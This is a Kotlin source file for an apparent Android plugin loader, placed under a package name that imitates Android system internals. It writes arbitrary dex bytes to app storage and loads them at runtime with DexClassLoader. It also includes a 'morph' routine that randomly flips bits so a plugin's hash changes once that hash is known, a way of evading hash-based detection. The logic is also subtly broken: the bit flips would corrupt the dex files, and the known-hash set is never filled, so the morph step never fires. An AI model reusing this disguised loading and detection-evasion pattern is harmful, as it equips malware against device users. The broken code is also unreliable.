package com.android.internal.os.plugin

import android.content.Context
import dalvik.system.DexClassLoader
import java.io.File
import java.security.MessageDigest
import kotlin.random.Random

class PluginLoader private constructor() {

    private var context: Context? = null
    private val loadedPlugins = mutableMapOf<String, Plugin>()
    private val knownHashes = mutableSetOf<String>()
    private var morphCount = 0

    fun init(ctx: Context) {
        context = ctx
    }

    fun loadPlugin(plugin: Plugin): Boolean {
        return try {
            val ctx = context ?: return false
            val dexFile = File(ctx.filesDir, "${plugin.name}.dex")
            dexFile.writeBytes(plugin.dexBytes)
            val optimizedDir = File(ctx.filesDir, "optimized")
            optimizedDir.mkdirs()
            DexClassLoader(dexFile.absolutePath, optimizedDir.absolutePath, null, ctx.classLoader)
            loadedPlugins[plugin.name] = plugin
            plugin.hash = sha256(plugin.dexBytes)
            true
        } catch (_: Exception) { false }
    }

    fun morphPlugin(plugin: Plugin): Plugin {
        val bytes = plugin.dexBytes.copyOf()
        for (i in 0 until minOf(32, bytes.size)) {
            val idx = Random.nextInt(bytes.size)
            bytes[idx] = (bytes[idx].toInt() xor (1 shl Random.nextInt(8))).toByte()
        }
        morphCount++
        return Plugin(plugin.name, plugin.version, bytes, sha256(bytes), plugin.enabled)
    }

    fun autoMorphIfCompromised(): List<String> {
        val morphed = mutableListOf<String>()
        for ((name, plugin) in loadedPlugins) {
            val currentHash = sha256(plugin.dexBytes)
            if (currentHash in knownHashes) {
                val morphedPlugin = morphPlugin(plugin)
                loadedPlugins[name] = morphedPlugin
                knownHashes.remove(currentHash)
                knownHashes.add(morphedPlugin.hash)
                morphed.add(name)
            }
        }
        return morphed
    }

    fun getPlugin(name: String): Plugin? = loadedPlugins[name]

    fun getReport(): String {
        return """=== Plugins ===
Loaded: ${loadedPlugins.size}
Morphs: $morphCount
Names: ${loadedPlugins.keys.joinToString(", ")}"""
    }

    private fun sha256(data: ByteArray): String {
        val digest = MessageDigest.getInstance("SHA-256")
        return digest.digest(data).joinToString("") { "%02x".format(it) }
    }

    companion object {
        @Volatile private var instance: PluginLoader? = null
        fun getInstance(): PluginLoader {
            return instance ?: synchronized(this) {
                instance ?: PluginLoader().also { instance = it }
            }
        }
    }
}
